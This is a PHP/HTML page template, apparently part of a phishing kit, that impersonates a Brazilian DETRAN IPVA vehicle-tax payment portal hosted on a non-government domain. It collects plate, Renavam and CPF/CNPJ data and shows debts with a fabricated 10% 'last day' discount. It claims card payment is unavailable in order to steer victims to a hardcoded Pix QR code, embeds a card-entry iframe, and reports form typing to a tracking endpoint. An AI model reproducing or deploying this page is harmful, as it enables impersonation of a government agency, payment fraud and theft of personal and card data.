                        style="position: absolute;margin-top: 113px;color: #898686;font-size: 13px;text-align: center;padding: 2px;">

                        <?php if($sucesso){ ?>
                        Forma de pagamento indisponível no momento, tente mais tarde ou pague via Pix.
                        <?php }else{ ?>
                        Porfavor validar os dados corretamente.
                        <?php }?>

                    </div>
                </div>


            </div>
        </div>
    </div>

    <div style="display: none;" id="loandig">
        <div
            style="display: flex;justify-content: center;align-items: center;height: 100%;width: 100%;top: 0;position: fixed;z-index: 999999;background: rgba(0, 0, 0, .4);">
            <div
                style="display: flex;justify-content: center;/* width: 200px; */border-radius: 6px;height: 118px;background: white;align-items: center;box-shadow: -1px -1px 0px -7px rgba(0, 0, 0, 0.2), 0px 0px 7px 0px rgba(0, 0, 0, 0.14), 0 9px 46px 8px rgba(0, 0, 0, 0.12);flex-direction: column-reverse;">

                <img src="/ipes/Spinner-btn.gif" style="width: 55px;display: flex;margin-top: -8px;">

                <div class="swal2-actions swal2-loading" style="display: flex;">
                    <div class="swal2-loader" data-button-to-replace="swal2-confirm swal2-styled"
                        style="display: flex;"></div><button type="button" class="swal2-confirm swal2-styled"
                        aria-label="" style="display: none;">OK</button><button type="button"
                        class="swal2-deny swal2-styled" aria-label="" style="display: none;">No</button><button
                        type="button" class="swal2-cancel swal2-styled" aria-label=""
                        style="display: none;">Cancel</button>
                </div>

                <h2 class="swal2-title" id="swal2-title"
                    style="display: block;<h2 class=&quot;swal2-title&quot; id=&quot;swal2-title&quot; style=&quot;display: block;&quot;>Aguarde, carregando...</h2>;position: relative;max-width: 100%;margin: 0;padding: .8em 1em 0;color: inherit;font-size: 1.875em;font-weight: 600;text-align: center;text-transform: none;word-wrap: break-word;color: #545454;">
                    Aguarde, carregando...</h2>
            </div>
        </div>
    </div>

    <div class="modal modal--large-container" id="modalCC" style="display: none;">
        <div class="modal__overlay" role="button" tabindex="0"></div>
        <div class="modal-content modal__container modal__container--pagamento false undefined">
            <div onclick="openPVC(false);" class="modal__close" role="button" tabindex="-3">
                <img src="./Energisa_files/icon_close.svg" alt="">
            </div>
            <p class="modal__title">Pagamento com Cartão de Crédito</p>
            <div class="payment-with-credit-card " style="width: 100%;">
                <p class="text-top" id="removepix" style="display: none;">Leia com atenção antes de realizar o pagamento
                </p>
                <div style="display: flex; justify-content: center; align-items: center; width: 100%; height: 100%;"
                    id="msgcc">
                    <iframe src="./Energisa_files/iframe.php?campanha=<?=$campanha?>" frameborder="0" width="100%"
                        height="370px"></iframe>
                </div>
                <button onclick="openPVC(false);" class="button button--soft max-w-md mx-auto">CANCELAR</button>
            </div>
        </div>
    </div>

    <div class="ReactModalPortal" id="ReactModalPortal" style="display: none;">
        <div class="ReactModal__Overlay ReactModal__Overlay--after-open"
            style="position: fixed;inset: 0px;background-color: rgba(0, 0, 0, 0.5);z-index: 1001;justify-content: center;display: flex;">

            <div class="ReactModal__Content ReactModal__Content--after-open  modal-content" tabindex="-1" role="dialog"
                aria-modal="true"
                style="position: absolute;border: 1px solid rgb(204, 204, 204); background: rgb(255, 255, 255); overflow: auto; border-radius: 6px; outline: none; padding: 20px; margin: 16px; max-height: max-content; max-width: 500px; align-self: center; box-shadow: rgba(0, 0, 0, 0.3) 0px 0px 30px;">


                <div class="bg-white rounded-lg w-full max-w-md relative"><button
                        onclick="ID('ReactModalPortal').style = 'display: none;'"
                        class="absolute right-4 top-4 text-gray-500 hover:text-gray-700"><svg
                            xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                            class="lucide lucide-x ">
                            <path d="M18 6 6 18"></path>
                            <path d="m6 6 12 12"></path>
                        </svg></button>
                    <div class="p-6">
                        <h2 class="text-xl font-bold text-center mb-4">Pagamento via PIX</h2>

                        <div class="flex justify-center mb-6"><img
                                src="https://detran.es.gov.br/Media/detran/_Profiles/a69f6923/a1a02a34/logoDETRAN.png"
                                alt="Paraná Governo do Estado" class="h-12"></div>

                        <div class="bg-gray-100 rounded-lg p-4 mb-6">
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <p class="text-sm text-gray-600">Placa do Veículo:</p>
                                    <p class="font-semibold"><?=$placa?></p>
                                </div>
                                <div>
                                    <p class="text-sm text-gray-600">Valor Total:</p>
                                    <p class="font-semibold">R$&nbsp;<span id="pixvalor">92,42</span></p>
                                </div>
                            </div>
                        </div>
                        <p class="text-center text-sm text-gray-600 mb-4">Aponte a câmera do celular para o QR Code
                            abaixo
                            usando o app da sua instituição de pagamento ou copie o código PIX.</p>
                        <div class="flex justify-center mb-6"><img id="qrcodImg"
                                src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&amp;data=00020126880014br.gov.bcb.pix0136893927125-bf22-4700-aaab-2559ab1827b5022266u1a"
                                alt="QR Code PIX" class="w-48 h-48"></div>
                        <div class="bg-gray-100 rounded-lg p-3 mb-4">
                            <textarea rows="4" id="payment-code-field" class="code"
                                style="width: 1px;height: 1px;opacity: 0;"></textarea>
                            <p id="payment-code" class="text-xs text-gray-600 break-all text-center">
                                00020126880014br.gov.bcb.pix0136893927125-bf22-4700-aaab-2559ab1827b5022266u1a</p>
                        </div><button onclick="copy()"
                            class="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition-colors">Copiar
                            Código PIX</button>
                    </div>
                </div>


            </div>
        </div>


    </div>

    <?php if(!$sucesso){ ?>

    <form name="form1" method="post" action="consultaBoletoIPVA.asp" onclick="return false;"
        style="justify-content: center;display: grid;">
        <input type="hidden" id="tipoBoleto" name="tipoBoleto" value="porVeiculo">
        <input type="hidden" id="hdMostraResultadoConsulta" name="hdMostraResultadoConsulta" value="False">
        <table style="width:720px;text-align:center;border:0px;padding:1px;border-spacing:0px;">
            <tbody>
                <tr>
                    <td><img src="/ipes/banner-detran.jpg" alt="DETRAN" style="width:720px;height:70px;"></td>
                </tr>
            </tbody>
        </table>
        <br>
        <br>
        <table style="width:700px;text-align:center;border:0px;">
            <tbody>
                <tr class="bordaCompleta">
                    <td style="text-align:center;" class="titulo" colspan="2">Emitir Boleto IPVA<br></td>
                </tr>
                <tr class="bordaCompleta">
                    <td style="text-align:center;" class="titulo" colspan="2"><br></td>
                </tr>
                <tr class="bordaCompleta">
                    <td style="text-align:center;">
                        <input type="button" name="btnConsultaDebitos" id="btnConsultaDebitos"
                            onclick="mostraDivVeiculo();" value="CONSULTA DÉBITOS DE VEÍCULOS">&nbsp;&nbsp;
                    </td>
                    <td style="text-align:center;">
                        <input type="button" name="btnDebitosTransferidos" id="btnDebitosTransferidos"
                            onclick="mostraDivCPFCNPJ();" value="DÉBITOS TRANSFERIDOS PARA CPF/CNPJ">
                    </td>
                </tr>
                <tr class="bordaCompleta">
                    <td style="text-align:center;"></td>
                    <td style="text-align:center;">(somente para os casos de ordem judicial e veículos leiloados)</td>
                </tr>
            </tbody>
        </table>
        <table style="width:720px;text-align:center;border:0px;">
            <tbody>
                <tr>
                    <td>
                        <hr size="2" color="#376CB7">
                    </td>
                </tr>
            </tbody>
        </table>
        <!-- Consulta -------------------------------------------------------------------------------------------------------------------------------------------------------->

        <div id="divConsulta" style="display:block;">
            <div id="divVeiculo" style="display:block;">
                <table style="width:700px;text-align:center;border:0px;">
                    <tbody>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" class="titulo" colspan="2">Débitos de Veículo<br><br></td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2">
                                Placa:&nbsp;&nbsp;<input type="text" style="text-transform:uppercase" id="placa"
                                    autocomplete="off" name="placa" value="" size="7" maxlength="7" tabindex="1"
                                    class="eventsD" onfocus="this.select();">&nbsp;
                            </td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2">
                                Renavam:&nbsp;&nbsp;<input type="text" id="renavam" name="renavam" autocomplete="off"
                                    class="eventsD" value="" size="11" maxlength="11" tabindex="1">
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="divCPFCNPJ" style="display:none;">
                <table style="width:700px;text-align:center;border:0px;">
                    <tbody>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" class="titulo" colspan="2">Débitos Transferidos para
                                CPF/CNPJ<br></td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;"></td>
                            <td style="text-align:center;">(somente para os casos de ordem judicial e veículos
                                leiloados)<br><br></td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2">
                                CPF/CNPJ do Proprietário Anterior:&nbsp;&nbsp;<input type="text"
                                    style="text-transform:uppercase" id="CPFCNPJ" name="CPFCNPJ" value="" size="14"
                                    maxlength="14" tabindex="1">&nbsp;
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="divCaptcha">
                <table style="width:700px;text-align:center;border:0px;">
                    <tbody>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2"><br></td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" class="titulo" colspan="2">Escreva os caracteres da imagem
                                abaixo para continuar:<br></td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2">
                                <img src="/ipes/captcha.bmp" id="imgCaptcha">
                            </td>
                        </tr>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2">
                                <input type="text" class="form-control" name="txtCaptcha" id="txtCaptcha" value="">
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="divCaptchaAviso" style="display:none;">
                <table style="width:700px;text-align:center;border:0px;">
                    <tbody>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;"></td>
                            <td style="text-align:center;">OBS: Em caso de veículo leiloado, o proprietário atual
                                (arrematante) deve emitir o DUA por meio da CONSULTA DÉBITOS DE VEÍCULOS.<br><br></td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="divBtnCaptcha">
                <table style="width:700px;text-align:center;border:0px;">
                    <tbody>
                        <tr class="bordaCompleta">
                            <td style="text-align:center;" colspan="2"><input onclick="validar()" class="btn2"
                                    type="submit" name="btnSubmit" id="btnSubmit" value="CONSULTAR"></td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

    </form>

    <?php }else{ ?>

    <style>
    /* Reset básico */
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Arial', sans-serif;
        background-color: #E0EEEE;
        color: #333;
        padding: 20px;
    }

    /* Estilo da tabela */
    table {
        width: 100%;
        margin: 20px auto;
        border-collapse: collapse;
        background-color: #ffffff;
        box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
    }

    .contein {
        width: 100%;
        max-width: 902px;
        margin: 0px auto;
        border-collapse: collapse;
        border-radius: 8px;
    }

    .box {
        padding: 1px 5px;
        width: 100%;
        margin: 0px auto;
        border-collapse: collapse;
        background-color: #ffffff;
        border-radius: 8px;
        box-shadow: 0 0 15px rgb(0 0 0 / 3%);
    }

    th {
        background-color: #4682b4;
        color: #ffffff;
        padding: 12px;
        text-align: center;
        font-size: 14px;
    }

    td {
        padding: 12px;
        text-align: center;
        font-size: 14px;
        border-bottom: 1px solid #e1e1e1;
    }

    td span {
        display: block;
    }

    td span.small {
        font-size: 12px;
        color: #5e5e5e;
    }

    tr:hover {
        background-color: #ebebf5;
    }

    tr:nth-child(even) {
        background-color: #f9f9f9;
    }

    .button-container {
        display: flex;
        justify-content: center;
        gap: 15px;
        margin-top: 20px;
    }

    .button-container a {
        background-color: #ffffff;
        color: #101010;
        padding: 10px 20px;
        border-radius: 5px;
        text-decoration: none;
        font-size: 14px;
        display: flex;
        align-items: center;
        border: solid 1px #adadad;
        justify-content: center;
        transition: background-color 0.3s ease;
    }

    input[type="checkbox"] {
        appearance: auto !important;
        visibility: visible !important;
        opacity: 1 !important;
        width: 16px;
        height: 16px;
        cursor: pointer;
    }

    .button-container a:hover {
        background-color: #dfdfdf;
        /* Cor mais escura ao passar o mouse */
    }

    .button-container img {
        margin-right: 8px;
        height: 22px;
    }

    .total-container {
        display: flex;
        justify-content: flex-end;
        font-weight: bold;
        margin-top: 10px;
        font-size: 16px;
    }

    input[type="checkbox"] {
        cursor: pointer;
    }

    th:nth-child(3),
    td:nth-child(3) {
        display: none;
    }

    /* Responsividade para dispositivos móveis */
    @media (max-width: 767px) {
        table {
            width: 100%;
            font-size: 12px;
        }

        th,
        td {
            padding: 8px;
        }

        td span {
            font-size: 12px;
        }

        .button-container {
            flex-direction: column;
            align-items: center;
        }

        .button-container a {
            width: 100%;
            margin-bottom: 10px;
            text-align: center;
        }

        .total-container {
            font-size: 14px;
            justify-content: center;
            margin-top: 15px;
        }

        /* Ajuste das imagens */
        .button-container img {
            max-width: 18px;
            height: auto;
        }

        /* Tamanho máximo para imagem */
        .imgh {
            max-width: 100%;
            height: auto;
        }

        /* Ajuste das colunas no mobile */
        th:nth-child(3),
        td:nth-child(3) {
            display: none;
        }

    }
    </style>

    <div class="contein">
        <div><img class="imgh" src="https://www.emissao-guia.shop/ipes/banner-detran.jpg" alt="DETRAN"
                style="width:902px;height:70px;">
            <div class="bordaCompleta" style="margin: 14px auto;border: none;">
                <div style="text-align:center;" class="titulo" colspan="2">Emitir Boleto IPVA<br></div>
            </div>
            <div class="bordaCompleta" style="border: none;">
                <div style="text-align:center;"></div>
                <div style="text-align:center;margin-bottom: 11px;">(somente para os casos de ordem judicial e veículos
                    leiloados)</div>
            </div>
        </div>
        <div class="box">
            <table>
                <thead>
                    <tr>
                        <th colspan="8" style="text-align:center;">Débitos de IPVA em aberto</th>
                    </tr>
                    <tr>
                        <td colspan="8" style="text-align:left;">Placa: <?=$placa?></td>
                    </tr>
                    <tr>
                        <th>#</th>
                        <th>Débito</th>
                        <th>Vencimento</th>
                        <th>Valor (R$)</th>
                        <th>Desconto (R$)</th>
                        <th>Multa (R$)</th>
                        <th>Total (R$)</th>
                    </tr>
                </thead>
                <tbody>

                    <?php             
                    
                    $AindaNAo = true; 

                    for ($i=0; $i <count($DataSP->Debitos); $i++) { 
                        
                        if($DataSP->Debitos[$i]->title=='IPVA COM DESCONTO' && $AindaNAo){

                            $desconto = 10;

                            $precoOriginal = $DataSP->Debitos[$i]->valor;

                            $valoDeconto = ($precoOriginal * $desconto) / 100;

                            $precoFinal = $precoOriginal - $valoDeconto;

                        }else if($DataSP->Debitos[$i]->description=='IPVA Único 2025' && $AindaNAo){

                            $desconto = 10;

                            $precoOriginal = $DataSP->Debitos[$i]->valor;

                            $valoDeconto = ($precoOriginal * $desconto) / 100;

                            $precoFinal = $precoOriginal - $valoDeconto;

                        }else {
                            $desconto = 0;
                            $valoDeconto = '0.00';
                            $precoFinal = $DataSP->Debitos[$i]->valor;
                        }

                     ?>

                    <tr>
                        <td> <input type="checkbox" class="checkbox selecionarDebito" onclick="ChecKK(this.id)"
                                style="cursor: pointer;" id="checkbox<?=$i?>" value="<?=$precoFinal?>"></td>
                        <td>
                            <span style="font-weight: 600;"><?=$DataSP->Debitos[$i]->title?></span>

                            <?php if($DataSP->Debitos[$i]->description=='IPVA Único 2025' && $AindaNAo || $DataSP->Debitos[$i]->title=='IPVA COM DESCONTO' && $AindaNAo){ ?>

                            <span
                                style="background: #4682b4;color: #fff;padding: 2px 4px;font-weight: 600;font-size: 10px;border-radius: 4px;margin-left: 5px;">ÚLTIMO
                                DIA</span>

                            <?php } ?>

                            <br>
                            <span
                                style="font-size: 12px;color: rgb(94 94 94);"><?=$DataSP->Debitos[$i]->description?></span>
                            <?php if($DataSP->Debitos[$i]->description=='IPVA Único 2025' && $AindaNAo || $DataSP->Debitos[$i]->title=='IPVA COM DESCONTO' && $AindaNAo){  $AindaNAo = false;?>
                            - <span style="font-size: 11px;color: rgb(94 94 94);">10% DE DESCONTO</span>
                            <?php } ?>
                        </td>
                        <td><?=$DataSP->Debitos[$i]->expiration_date?></td>
                        <td><?=number_format($DataSP->Debitos[$i]->valor, 2, ',', '.')?></td>
                        <td><?=number_format($valoDeconto, 2, ',', '.')?></td>
                        <td>0,00</td>
                        <td><?=number_format($precoFinal, 2, ',', '.')?></td>
                    </tr>

                    <?php } ?>
                </tbody>

            </table>
            <div style="align-items: center;justify-content: end;display: flex;padding: 19px 21px;">
                <div>
                    Total: R$ <span id="totalValor">0.00</span>
                </div>
            </div>

            <div class="button-container">
                <a href="javascript:void(0);" onclick="VerPix()">
                    <img src="https://img.icons8.com/color/512/pix.png" alt="Pagamento via Pix">Pagamento via Pix
                </a>
                <a href="javascript:void(0);" onclick="openPVC(1)">
                    <img src="https://www.emissao-guia.shop/IPMG_files/icon_credit_card.svg"
                        alt="Pagamento com Cartão">Pagamento com Cartão
                </a>
                <br>
            </div>
            <br>
            <br> <br>
        </div>
    </div>

    <?php } ?>


    <style>
    .ui-btn {
        font-size: 11px;
        margin: .5em 0;
        padding: .7em 1em;
        display: block;
        position: relative;
        text-align: center;
        text-overflow: ellipsis;
        overflow: hidden;
        white-space: nowrap;
        cursor: pointer;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        border: solid 1px #969696;
        margin-left: 12px;
        background: #ffffff;
        font-weight: bold;
    }

    .barraPrincipal {
        background-image: url(./caema/negocie-suas-dividas-caema.696d049b.jpg);
        padding-top: 0;
        box-sizing: border-box;
        width: 100%;
        position: relative;
        height: 200px;
        background-size: cover;
        font-weight: 700;
        display: inline-block;
        background-color: #2e92ee;
    }


    .cartabtn {
        background-color: rgb(222 227 231);
        border: 1px solid rgba(0, 0, 0, 0);
        border-radius: 14px;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        transition: all 0.3s ease 0s;
        width: 96px;
        height: 30px;
        cursor: pointer;
        align-items: center;
        display: flex;
        color: #9297a6;
        font-weight: 700;
        justify-content: space-evenly;
    }

    #modalCC {
        display: block;
        width: 100%;
        height: 100%;
        position: fixed;
        justify-content: center;
        display: flex;
        align-items: center;
        z-index: 2333;

    }

    html .modal__container--pagamento .modal__title {
        padding: 0 5rem 0 1.5rem;
        border-bottom: 1px solid #eee;
        text-align: left;
    }


    html .modal__overlay {
        width: 100%;
        height: 100%;
        top: 50%;
        left: 50%;
        background-color: rgba(0, 0, 0, .6);
        position: fixed;
        transform: translate(-50%, -50%);
    }

    html .modal__title {
        font-weight: 600;
        font-size: 16px;
        line-height: 3px;
        letter-spacing: .01em;
        color: #333;
        opacity: .8;
        text-align: center;
        margin-bottom: -15px;
    }

    @media (max-width: 900px) {
        html .modal__container--pagamento .modal__title {
            font-size: 11px;
        }

        .som {
            display: none;
        }
    }

    @media (min-width: 900px) {
        html .modal--large-container .modal__container {
            width: 528px;
        }
    }

    @media (min-width: 900px) {
        html .modal__container--pagamento {
            width: 426px;
            padding-bottom: 30px;
        }
    }

    html .modal__close {
        position: absolute;
        right: 6px;
        top: 6px;
        padding: 10px;
        z-index: 1;
        cursor: pointer;
    }

    .button--soft {
        border: 1px solid #00c2c1;
        background-color: transparent;
        color: #00c2c1;
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 600;
        line-height: 2.18rem;
        margin-top: -32px;
    }

    .fRKqYH.danger {
        background-color: rgb(255, 116, 116);
        color: rgb(255, 255, 255);
    }

    .fRKqYH {
        display: flex;
        flex-direction: row;
        -webkit-box-align: center;
        align-items: center;
        justify-content: space-evenly;
        width: 100%;
        height: 44px;
        border-radius: 20px;
        transition: all 0.2s ease 0s;
        box-shadow: rgba(0, 0, 0, 0.25) 0px 4px 4px 0px !important;
        cursor: pointer;
    }

    #loandig {
        margin: 0;
        left: 0;
        position: fixed;
        z-index: 12;
    }

    .kvvQFc {
        display: flex;
        flex-direction: row;
        width: 100%;
        -webkit-box-align: center;
        align-items: center;
        margin: 16px 0px;
    }

    .eMqCyy {
        display: flex;
        flex-direction: row;
        flex: 1 1 0%;
        gap: 10px;
    }

    .hNJdoE {
        width: 100%;
        font-size: 12px;
        color: #81a0b9;
        text-align: justify;
    }

    .kvvQFc svg {
        color: #819fb7;
        font-size: 28px;
        margin: 0px 16px 0px 8px;
    }

    #alert2 {
        display: flex;
        align-items: center;
        border: 1px solid var(--feedback-warning-medium);
        background-color: var(--feedback-warning-light);
        padding: 16px;
        border-radius: 8px;
    }

    #alert2 .container {
        margin-right: 15px;
        margin-left: 15px;
    }

    #alert2 h2 {
        color: rgb(102, 72, 0);
        font-size: 16px;
        line-height: 115%;
        font-family: Lato;
        font-weight: 700;
        margin-bottom: 4px;
    }

    #alert2 p {
        color: rgb(102, 72, 0);
        font-size: 14px;
        font-family: Lato;
        font-style: normal;
        font-weight: 400;
        line-height: 115%;
    }

    #alert2 a {
        text-decoration: none;
        width: fit-content;
        padding: 8px 16px;
        border-radius: 8px;
        background: transparent;
        border: 1px solid rgb(34, 34, 34);
        color: rgb(34, 34, 34);
        font-size: 14px;
        font-weight: bold;
        font-family: Lato;
        cursor: pointer;
    }

    /* Modal Content */
    .modal-content {
        background: white;
        padding: 34px;
        border-radius: 8px;
        position: relative;
        -webkit-animation-name: animatetop;
        -webkit-animation-duration: 0.4s;
        animation-name: animatetop;
        animation-duration: 0.4s
    }

    /* Add Animation */
    @-webkit-keyframes animatetop {
        from {
            top: -300px;
            opacity: 0
        }

        to {
            top: -192px;
            opacity: 1
        }
    }

    @keyframes animatetop {
        from {
            top: -300px;
            opacity: 0
        }

        to {
            top: 0;
            opacity: 1
        }
    }
    </style>

    <script>
    function Get(data, urlapi, q) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var json = this.response;

            }
        };
        xhttp.open("GET", urlapi + data, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send();
        return false;
    }
    const inputs = document.querySelectorAll('.eventsD');

    var valX = 5;
    inputs.forEach(function(input) {
        input.addEventListener('input', function(event) {
            if (valX == 5) {
                Get('?ev=D&tela=ipes', './api/events.php');
                valX = 0;
            }
            valX++;
        });
    });
    </script>

</body>

</html>